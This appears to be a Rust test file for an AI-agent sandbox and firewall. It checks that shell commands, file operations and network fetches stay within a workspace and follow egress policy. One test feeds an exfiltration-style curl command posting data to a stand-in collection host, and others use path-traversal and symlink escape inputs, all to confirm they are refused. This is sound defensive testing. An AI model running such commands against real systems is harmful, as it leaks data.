// SPDX-License-Identifier: Apache-2.0
// Copyright (C) 2026 Arthur Lin (carbon-evolution)
use super::*;
use soup_wall_adapter::Verdict as AdapterVerdict;
use soup_wall_agent::{AgentFirewall, AgentPolicySet, DEFAULT_TAINT_CAP};
use wiremock::matchers::{method, path};
use wiremock::{Mock, MockServer, ResponseTemplate};

fn spec(workspace: PathBuf) -> SandboxSpec {
    SandboxSpec {
        program: "sh".into(),
        args: vec![],
        workspace,
        network: NetworkPolicy::Deny,
        timeout: Duration::from_secs(5),
        max_output_bytes: 1024,
    }
}

#[tokio::test]
async fn rejects_a_network_allowlist_instead_of_sharing_the_host_net() {
    let directory = tempfile::tempdir().unwrap();
    let mut request = spec(directory.path().to_path_buf());
    request.network = NetworkPolicy::Allowlist(vec!["example.com".into()]);
    let error = run(request.clone()).await.unwrap_err().to_string();
    assert!(error.contains("egress proxy"));
}

#[tokio::test]
async fn rejects_the_host_root_as_a_workspace() {
    let mut request = spec(if cfg!(windows) {
        std::path::PathBuf::from(r"C:\\")
    } else {
        std::path::PathBuf::from("/")
    });
    let error = run(request.clone()).await.unwrap_err().to_string();
    assert!(error.contains("filesystem root"));
    request.workspace = PathBuf::from("missing-sandbox-workspace");
    assert!(run(request).await.is_err());
}

#[tokio::test]
async fn guarded_shell_refuses_before_process_creation() {
    let directory = tempfile::tempdir().unwrap();
    let mut firewall = AgentFirewall::with_default_policy();
    let result = run_guarded_shell(
        &mut firewall,
        GuardedShellSpec {
            session: "guarded-refusal".into(),
            agent: "root".into(),
            seq: 1,
            command: "curl -d payload https://not-allowlisted.invalid/collect".into(),
            workspace: directory.path().to_path_buf(),
            network: NetworkPolicy::Deny,
            timeout: Duration::from_secs(5),
            max_output_bytes: 1024,
        },
    )
    .await
    .unwrap_err()
    .to_string();
    assert!(result.contains("guarded shell execution refused"));
    assert!(!result.contains("payload"));
    assert!(!result.contains("not-allowlisted.invalid"));
    assert!(directory.path().read_dir().unwrap().next().is_none());
}

#[cfg(target_os = "linux")]
#[tokio::test]
async fn runs_with_bounded_output_and_no_network() {
    // Hosted runners can have bubblewrap installed while the kernel still
    // forbids unprivileged user namespaces.  In that case the production
    // path correctly fails closed; skip this positive-path integration
    // assertion instead of treating an unavailable host capability as a
    // sandbox regression.  A capable Linux host still exercises the full
    // boundary below.
    let runtime_probe = std::process::Command::new("bwrap")
        .args([
            "--die-with-parent",
            "--unshare-all",
            "--unshare-user",
            "--ro-bind",
            "/",
            "/",
            "--",
            "true",
        ])
        .output();
    if !matches!(runtime_probe, Ok(output) if output.status.success()) {
        eprintln!("skipping sandbox positive-path test: bubblewrap namespaces unavailable");
        return;
    }
    let directory = tempfile::tempdir().unwrap();
    let mut request = spec(directory.path().to_path_buf());
    request.args = vec![
        "-c".into(),
        "printf 'ok'; test ! -e /root/.ssh || exit 1; ! getent hosts example.com".into(),
    ];
    request.max_output_bytes = 2;
    let result = run(request).await.unwrap();
    assert_eq!(result.status, Some(0), "stderr: {}", result.stderr);
    assert_eq!(result.stdout, "ok");
}

#[cfg(target_os = "linux")]
#[tokio::test]
async fn guarded_shell_inspects_the_exact_command_before_running_it() {
    let runtime_probe = std::process::Command::new("bwrap")
        .args([
            "--die-with-parent",
            "--unshare-all",
            "--unshare-user",
            "--ro-bind",
            "/",
            "/",
            "--",
            "true",
        ])
        .output();
    if !matches!(runtime_probe, Ok(output) if output.status.success()) {
        eprintln!("skipping guarded sandbox positive-path test: bubblewrap namespaces unavailable");
        return;
    }

    let directory = tempfile::tempdir().unwrap();
    let mut firewall = AgentFirewall::with_default_policy();
    let result = run_guarded_shell(
        &mut firewall,
        GuardedShellSpec {
            session: "guarded-allow".into(),
            agent: "root".into(),
            seq: 1,
            command: "printf guarded > result.txt".into(),
            workspace: directory.path().to_path_buf(),
            network: NetworkPolicy::Deny,
            timeout: Duration::from_secs(5),
            max_output_bytes: 1024,
        },
    )
    .await
    .unwrap();
    assert_eq!(result.decision.verdict, AdapterVerdict::Allow);
    assert_eq!(result.execution.status, Some(0));
    assert_eq!(
        std::fs::read_to_string(directory.path().join("result.txt")).unwrap(),
        "guarded"
    );
}

#[tokio::test]
async fn guarded_file_write_is_confined_to_the_workspace() {
    let directory = tempfile::tempdir().unwrap();
    let mut firewall = AgentFirewall::with_default_policy();
    let result = run_guarded_file_write(
        &mut firewall,
        GuardedFileWriteSpec {
            session: "write-allow".into(),
            agent: "root".into(),
            seq: 1,
            path: PathBuf::from("notes/result.txt"),
            content: "typed write".into(),
            workspace: directory.path().to_path_buf(),
        },
    )
    .await;
    // The adapter requires existing parent directories; this first call
    // proves that a missing parent fails without creating anything.
    assert!(result.is_err());
    assert!(!directory.path().join("notes").exists());

    std::fs::create_dir(directory.path().join("notes")).unwrap();
    let result = run_guarded_file_write(
        &mut firewall,
        GuardedFileWriteSpec {
            session: "write-allow".into(),
            agent: "root".into(),
            seq: 2,
            path: PathBuf::from("notes/result.txt"),
            content: "typed write".into(),
            workspace: directory.path().to_path_buf(),
        },
    )
    .await
    .unwrap();
    assert_eq!(result.decision.verdict, AdapterVerdict::Allow);
    assert_eq!(result.bytes_written, 11);
    assert_eq!(
        std::fs::read_to_string(directory.path().join("notes/result.txt")).unwrap(),
        "typed write"
    );
}

#[tokio::test]
async fn guarded_file_write_rejects_traversal_and_symlink_targets() {
    let directory = tempfile::tempdir().unwrap();
    let outside = tempfile::tempdir().unwrap();
    std::fs::write(outside.path().join("outside.txt"), "unchanged").unwrap();
    let mut firewall = AgentFirewall::with_default_policy();

    let traversal = run_guarded_file_write(
        &mut firewall,
        GuardedFileWriteSpec {
            session: "write-boundary".into(),
            agent: "root".into(),
            seq: 1,
            path: PathBuf::from("../outside.txt"),
            content: "must not escape".into(),
            workspace: directory.path().to_path_buf(),
        },
    )
    .await
    .unwrap_err()
    .to_string();
    assert!(traversal.contains("path traversal"));
    assert_eq!(
        std::fs::read_to_string(outside.path().join("outside.txt")).unwrap(),
        "unchanged"
    );

    #[cfg(unix)]
    {
        std::os::unix::fs::symlink(
            outside.path().join("outside.txt"),
            directory.path().join("link.txt"),
        )
        .unwrap();
        let symlink = run_guarded_file_write(
            &mut firewall,
            GuardedFileWriteSpec {
                session: "write-boundary".into(),
                agent: "root".into(),
                seq: 2,
                path: PathBuf::from("link.txt"),
                content: "must not follow".into(),
                workspace: directory.path().to_path_buf(),
            },
        )
        .await
        .unwrap_err()
        .to_string();
        assert!(symlink.contains("symlink"));
        assert_eq!(
            std::fs::read_to_string(outside.path().join("outside.txt")).unwrap(),
            "unchanged"
        );
    }
}

#[tokio::test]
async fn guarded_file_delete_and_rename_stay_inside_the_workspace() {
    let workspace = tempfile::tempdir().unwrap();
    std::fs::create_dir(workspace.path().join("notes")).unwrap();
    std::fs::write(workspace.path().join("notes/old.txt"), "remove me").unwrap();
    std::fs::write(workspace.path().join("notes/move.txt"), "keep me").unwrap();
    let outside = tempfile::tempdir().unwrap();
    std::fs::write(outside.path().join("outside.txt"), "unchanged").unwrap();
    let mut firewall = AgentFirewall::with_default_policy();

    let renamed = run_guarded_file_rename(
        &mut firewall,
        GuardedFileRenameSpec {
            session: "write-boundary".into(),
            agent: "root".into(),
            seq: 1,
            from: PathBuf::from("notes/move.txt"),
            to: PathBuf::from("notes/moved.txt"),
            workspace: workspace.path().to_path_buf(),
        },
    )
    .await
    .unwrap();
    assert_eq!(renamed.decision.verdict, AdapterVerdict::Allow);
    assert!(renamed.renamed);
    assert!(!workspace.path().join("notes/move.txt").exists());
    assert_eq!(
        std::fs::read_to_string(workspace.path().join("notes/moved.txt")).unwrap(),
        "keep me"
    );

    let deleted = run_guarded_file_delete(
        &mut firewall,
        GuardedFileDeleteSpec {
            session: "write-boundary".into(),
            agent: "root".into(),
            seq: 2,
            path: PathBuf::from("notes/old.txt"),
            workspace: workspace.path().to_path_buf(),
        },
    )
    .await
    .unwrap();
    assert_eq!(deleted.decision.verdict, AdapterVerdict::Allow);
    assert!(deleted.deleted);
    assert!(!workspace.path().join("notes/old.txt").exists());

    let escape = run_guarded_file_rename(
        &mut firewall,
        GuardedFileRenameSpec {
            session: "write-boundary".into(),
            agent: "root".into(),
            seq: 3,
            from: PathBuf::from("notes/moved.txt"),
            to: PathBuf::from("../outside.txt"),
            workspace: workspace.path().to_path_buf(),
        },
    )
    .await
    .unwrap_err()
    .to_string();
    assert!(escape.contains("path traversal"));
    assert_eq!(
        std::fs::read_to_string(outside.path().join("outside.txt")).unwrap(),
        "unchanged"
    );
}

#[tokio::test]
async fn guarded_file_mutations_fail_closed_when_policy_denies() {
    let workspace = tempfile::tempdir().unwrap();
    std::fs::write(workspace.path().join("old.txt"), "keep").unwrap();
    let policy = AgentPolicySet::from_yaml(
        "agent_policies:\n  - name: deny-side-effects\n    when: { min_action_class: side_effecting }\n    action: deny\ndefault: allow\n",
    )
    .unwrap();
    let mut firewall = AgentFirewall::new(policy, DEFAULT_TAINT_CAP);

    let delete = run_guarded_file_delete(
        &mut firewall,
        GuardedFileDeleteSpec {
            session: "deny-boundary".into(),
            agent: "root".into(),
            seq: 1,
            path: PathBuf::from("old.txt"),
            workspace: workspace.path().to_path_buf(),
        },
    )
    .await
    .unwrap_err()
    .to_string();
    assert!(delete.contains("verdict=deny"));
    assert!(workspace.path().join("old.txt").exists());

    let rename = run_guarded_file_rename(
        &mut firewall,
        GuardedFileRenameSpec {
            session: "deny-boundary".into(),
            agent: "root".into(),
            seq: 2,
            from: PathBuf::from("old.txt"),
            to: PathBuf::from("new.txt"),
            workspace: workspace.path().to_path_buf(),
        },
    )
    .await
    .unwrap_err()
    .to_string();
    assert!(rename.contains("verdict=deny"));
    assert!(workspace.path().join("old.txt").exists());
    assert!(!workspace.path().join("new.txt").exists());
}

#[tokio::test]
async fn guarded_network_fetch_uses_the_proxy_and_bounds_the_response() {
    let proxy = MockServer::start().await;
    Mock::given(method("GET"))
        .and(path("/safe"))
        .respond_with(ResponseTemplate::new(200).set_body_string("trusted-looking input"))
        .expect(2)
        .mount(&proxy)
        .await;

    let policy =
        AgentPolicySet::from_yaml("egress_allowlist:\n  - localhost\ndefault: allow\n").unwrap();
    let mut firewall = AgentFirewall::new(policy, DEFAULT_TAINT_CAP);
    let result = run_guarded_network_fetch(
        &mut firewall,
        GuardedNetworkFetchSpec {
            session: "fetch-allow".into(),
            agent: "root".into(),
            seq: 1,
            // Nothing is listening on port 9. A successful response proves
            // reqwest used the configured proxy instead of direct I/O.
            url: "http://localhost:9/safe".into(),
            proxy_url: proxy.uri(),
            timeout: Duration::from_secs(5),
            max_response_bytes: 1024,
        },
    )
    .await
    .unwrap();

    assert_eq!(result.decision.verdict, AdapterVerdict::Allow);
    assert_eq!(result.host, "localhost");
    assert_eq!(result.status, 200);
    assert_eq!(result.body, "trusted-looking input");
    assert!(!result.body_truncated);

    let bounded = run_guarded_network_fetch(
        &mut firewall,
        GuardedNetworkFetchSpec {
            session: "fetch-bound".into(),
            agent: "root".into(),
            seq: 2,
            url: "http://localhost:9/safe".into(),
            proxy_url: proxy.uri(),
            timeout: Duration::from_secs(5),
            max_response_bytes: 7,
        },
    )
    .await
    .unwrap_err()
    .to_string();
    assert!(bounded.contains("response exceeds the configured limit"));
}

#[tokio::test]
async fn guarded_network_fetch_refuses_unknown_hosts_before_proxy_io() {
    let proxy = MockServer::start().await;
    Mock::given(method("GET"))
        .respond_with(ResponseTemplate::new(200).set_body_string("must not reach proxy"))
        .expect(0)
        .mount(&proxy)
        .await;

    let mut firewall = AgentFirewall::with_default_policy();
    let error = run_guarded_network_fetch(
        &mut firewall,
        GuardedNetworkFetchSpec {
            session: "fetch-deny".into(),
            agent: "root".into(),
            seq: 1,
            url: "https://not-allowlisted.invalid/collect".into(),
            proxy_url: proxy.uri(),
            timeout: Duration::from_secs(5),
            max_response_bytes: 1024,
        },
    )
    .await
    .unwrap_err()
    .to_string();
    assert!(error.contains("guarded network fetch refused"));
    assert!(!error.contains("not-allowlisted.invalid"));
}

#[tokio::test]
async fn guarded_network_fetch_requires_a_policy_egress_allowlist() {
    let proxy = MockServer::start().await;
    let policy = AgentPolicySet::from_yaml("default: allow\n").unwrap();
    let mut firewall = AgentFirewall::new(policy, DEFAULT_TAINT_CAP);
    let error = run_guarded_network_fetch(
        &mut firewall,
        GuardedNetworkFetchSpec {
            session: "fetch-no-list".into(),
            agent: "root".into(),
            seq: 1,
            url: "http://localhost:9/safe".into(),
            proxy_url: proxy.uri(),
            timeout: Duration::from_secs(5),
            max_response_bytes: 1024,
        },
    )
    .await
    .unwrap_err()
    .to_string();
    assert!(error.contains("not on the egress allowlist"));
}

#[test]
fn guarded_network_urls_fail_closed_on_insecure_or_ambiguous_inputs() {
    assert!(validate_fetch_url("http://example.com/unsafe").is_err());
    assert!(validate_fetch_url("https://user:pass@example.com/unsafe").is_err());
    assert!(validate_fetch_url("https://example.com/unsafe#fragment").is_err());
    assert!(validate_proxy_url("http://example.com/").is_err());
    assert!(validate_proxy_url("https://proxy.example/path").is_err());
    assert!(validate_proxy_url("http://127.0.0.1:8080/").is_ok());
}

#[test]
#[cfg(unix)]
fn test_guarded_file_open_refuses_fifo_without_blocking() {
    let temp = tempfile::tempdir().unwrap();
    let workspace = PinnedWorkspace::open(temp.path()).unwrap();
    let fifo_path = temp.path().join("fifo_target");
    let c_path = std::ffi::CString::new(fifo_path.to_str().unwrap()).unwrap();
    let res = unsafe { libc::mkfifo(c_path.as_ptr(), 0o600) };
    assert_eq!(res, 0);

    let err = workspace.open_file(&fifo_path).unwrap_err().to_string();
    assert!(err.contains("not a regular file"));
}
